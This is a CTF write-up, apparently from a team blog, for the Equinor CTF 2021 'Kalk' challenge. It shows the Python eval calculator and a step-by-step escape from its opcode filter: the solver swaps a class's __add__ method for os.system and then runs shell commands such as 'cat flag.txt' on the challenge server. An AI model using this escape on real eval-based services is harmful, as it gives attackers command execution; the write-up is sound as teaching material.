[{"content":"Misc ðŸ”¥ Kalk ðŸ”¥  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.get_instructions(co): if opc.opname not in [\u0026#39;LOAD_NAME\u0026#39;, \u0026#39;LOAD_CONST\u0026#39;, \u0026#39;STORE_NAME\u0026#39;, \u0026#39;STORE_ATTR\u0026#39;, \u0026#39;RETURN_VALUE\u0026#39;]: print(\u0026#34;Bonk! \u0026gt;.\u0026lt;\u0026#34;, opc.opname) return eval(co, {}, locals) else: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;eval\u0026#34;) for opc in dis.get_instructions(co): if \u0026#39;CALL\u0026#39; in opc.opname: print(\u0026#39;No U! \u0026gt;.\u0026lt;\u0026#39;) return _ = eval(co, {}, locals | {\u0026#39;math\u0026#39;: Math(), \u0026#39;tease\u0026#39;: os.system}) locals[\u0026#39;_\u0026#39;] = _ return _ locals = {} while True: r = kalk(input(\u0026#39;\u0026gt; \u0026#39;), locals) if r is not None: print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don\u0026rsquo;t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don\u0026rsquo;t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046 \u0026gt; math {} \u0026gt; test = _ \u0026gt; test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046 \u0026gt; math.__class__ \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; \u0026gt; Math = _ \u0026gt; Math \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; Great, now we can overwrite __add__ with os.system\n\u0026gt; tease \u0026lt;built-in function system\u0026gt; \u0026gt; Math.__add__ = _ At last we can set the class of math to be our new class.\n\u0026gt; math {} \u0026gt; math = _ \u0026gt; math.__class__ = Math Now we should be able to run system commands by doing addition.\n\u0026gt; math + \u0026#34;id\u0026#34; uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0 \u0026gt; math + \u0026#34;ls\u0026#34; flag.txt kalk.py ynetd 0 \u0026gt; math + \u0026#34;cat flag.txt\u0026#34; EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\n","permalink":"https://bootplug.io/posts/ctf/equinorctf/","summary":"Misc ðŸ”¥ Kalk ðŸ”¥  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.","title":"Equinor CTF 2021"}]